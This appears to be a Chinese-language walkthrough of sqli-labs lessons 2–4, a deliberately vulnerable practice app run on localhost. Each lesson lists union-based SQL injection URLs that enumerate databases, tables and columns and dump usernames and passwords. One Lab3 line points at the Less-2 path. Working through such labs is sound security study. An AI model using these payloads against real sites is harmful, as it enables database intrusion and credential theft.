# Lab2 -- GET Error based integer

+ 输入?id=1'报错 -- 存在SQL注入

```
报错
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
```

+ 猜测语句

```mysql
有效判断语句为
' LIMIT 0,1
猜测
select * from table where id = id LIMIT 0,1
```

1. 先判断哪些选择可以被显示到网页上 -- 选择的第二个和第三个选项
2. 返回当前用户，数据库及其版本 -- 这里使用security数据库
3. 获取当前数据库中所有数据库
4. 获取当前数据库中的所有表 -- 获得emails，referers，uagents和users
5. 猜测账户密码在users中，获取users表中的所有columns -- 获得id，username和password三个字段
6. 获取账户和密码字段

命令总和（命令在hackbar中执行）

```mysql
http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,3 --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,group_concat(schema_name) from information_schema.schemata --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=0 union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from security.users
```



# Lab3 -- GET Error based single quotes with twist

+ 输入?id=1'报错 -- 存在SQL注入

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1
```

+ 猜测语句

```
有效语句
'1'') LIMIT 0,1
猜测
select * from table where id=('') LIMIT 0,1
```

+ 流程与Lab1和Lab2相同
+ 命令总和（还是用hackbar好了，下载旧版本，链接在此https://github.com/Mr-xn/hackbar2.1.3）

```mysql
http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,3 --+

http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,concat_ws(char(32,58,32),user(),database(),version()) --+

http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata --+

http://localhost/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

http://127.0.0.1/sqli-labs-master/Less-2/?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+

http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(concat_ws(char(32,58,32),id,username,password)) from security.users --+
```



# Lab4 -- GET Error based Double Quotes

+ 输入?id=1'不报错了，咦？
+ 输入?id=1"报错，观察观察

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1
```

+ 猜测语句

```
有效语句
"1"") LIMIT 0,1
猜测
select * from table where id=("id")
```

+ 所以现在用`id=-1")`代替上面的Lab3的`id=-1`就可以啦，其他流程都一样

